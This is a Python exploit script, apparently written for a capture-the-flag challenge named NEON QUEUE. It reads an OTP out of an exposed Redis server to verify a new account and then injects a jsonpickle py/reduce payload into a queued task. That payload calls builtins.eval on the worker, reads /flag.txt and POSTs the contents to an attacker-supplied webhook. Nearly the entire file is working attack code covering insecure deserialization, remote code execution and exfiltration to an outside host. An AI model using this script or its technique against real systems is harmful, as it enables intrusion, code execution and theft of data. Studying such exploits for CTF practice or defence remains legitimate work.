#!/usr/bin/env python3
"""
NEON QUEUE - Exploit Method 3: RCE with Webhook Exfiltration

This exploit uses jsonpickle's py/reduce to execute arbitrary Python code.
The flag is sent to a webhook URL for PRIVATE retrieval.

This is the recommended RCE method as other players cannot see your flag.

Usage:
    python exploit_rce_webhook.py <target_ip> <webhook_url>
    python exploit_rce_webhook.py 129.212.236.27 https://webhook.site/your-id
"""

import sys
import json
import base64
import zlib
import time
import redis
import requests


if len(sys.argv) < 3:
    print("Usage: python exploit_rce_webhook.py <target_ip> <webhook_url>")
    print("Example: python exploit_rce_webhook.py <target_ip> https://webhook.site/xxx")
    sys.exit(1)

TARGET = sys.argv[1]
WEBHOOK_URL = sys.argv[2]
REDIS_HOST = TARGET
REDIS_PORT = 6379
API_URL = f"http://{TARGET}:8000"


def create_rce_payload(webhook_url: str) -> str:
    """
    RCE payload that sends the flag to a webhook URL.
    Uses urllib to make HTTP request with the flag.
    """
    # This code runs on the worker and sends flag to webhook
    code = f"""
(lambda: (
    __import__('urllib.request', fromlist=['urlopen']).urlopen(
        __import__('urllib.request', fromlist=['Request']).Request(
            '{webhook_url}',
            data=open('/flag.txt', 'rb').read(),
            headers={{'Content-Type': 'text/plain'}}
        )
    ),
    'EXFIL_SUCCESS'
)[1])()
"""
    payload = {
        "py/reduce": [
            {"py/function": "builtins.eval"},
            {"py/tuple": [code.strip()]}
        ]
    }
    
    json_str = json.dumps(payload)
    print(f"[*] RCE Payload (Webhook exfil to {webhook_url}):")
    print(json.dumps(payload, indent=2))
    print()
    
    compressed = zlib.compress(json_str.encode('utf-8'))
    return base64.b64encode(compressed).decode('ascii')


def main():
    print("=" * 60)
    print(" NEON QUEUE - RCE EXPLOIT")
    print(" Method 3: Webhook Exfiltration (Private)")
    print("=" * 60)
    print(f"\n[*] Target: {TARGET}")
    print(f"[*] Webhook: {WEBHOOK_URL}")
    
    r = redis.Redis(host=REDIS_HOST, port=REDIS_PORT, decode_responses=True)
    
    try:
        r.ping()
        print(f"\n[+] Connected to Redis at {REDIS_HOST}:{REDIS_PORT}")
    except:
        print(f"[-] Failed to connect to Redis")
        return
    
    # Register user
    import random
    suffix = random.randint(1000, 9999)
    
    print(f"\n[*] Registering user...")
    resp = requests.post(f"{API_URL}/auth/register", json={
        "username": f"webhook{suffix}",
        "email": f"webhook{suffix}@gmail.com",
        "password": "webhook123"
    })
    if not resp.ok:
        print(f"[-] Registration failed: {resp.text}")
        return
    user_id = resp.json().get("user_id")
    print(f"[+] User ID: {user_id}")
    
    # Get OTP
    time.sleep(0.5)
    otp = r.get(f"otp:{user_id}")
    print(f"[+] OTP: {otp}")
    
    # Verify
    resp = requests.post(f"{API_URL}/auth/verify-otp", json={
        "user_id": user_id,
        "otp": otp
    })
    token = resp.json().get("access_token")
    print("[+] Account verified")
    
    # Submit task
    resp = requests.post(
        f"{API_URL}/tasks",
        headers={"Authorization": f"Bearer {token}"},
        json={"task_type": "system_status"}
    )
    task_id = resp.json().get("task_id")
    print(f"[+] Task ID: {task_id}")
    
    # Inject RCE payload
    print("\n[*] Injecting RCE payload...")
    payload = create_rce_payload(WEBHOOK_URL)
    r.set(f"task:{task_id}", payload)
    print("[+] Payload injected")
    
    # Wait for worker
    print("\n[*] Waiting for worker to send flag to webhook...")
    for i in range(10):
        time.sleep(1)
        resp = requests.get(
            f"{API_URL}/tasks/{task_id}",
            headers={"Authorization": f"Bearer {token}"}
        )
        result = resp.json()
        if result.get("status") in ["completed", "failed"]:
            break
        print(f"[.] Waiting... ({i+1}/10)")
    
    print("\n" + "=" * 60)
    print(f" Task Status: {result.get('status')}")
    print(f" Task Output: {result.get('output')}")
    print("=" * 60)
    
    if result.get("status") == "completed":
        print("\n[+] RCE executed! Check your webhook for the flag:")
        print(f"    {WEBHOOK_URL}")
    else:
        print("\n[-] Task failed - check worker logs")


if __name__ == "__main__":
    main()
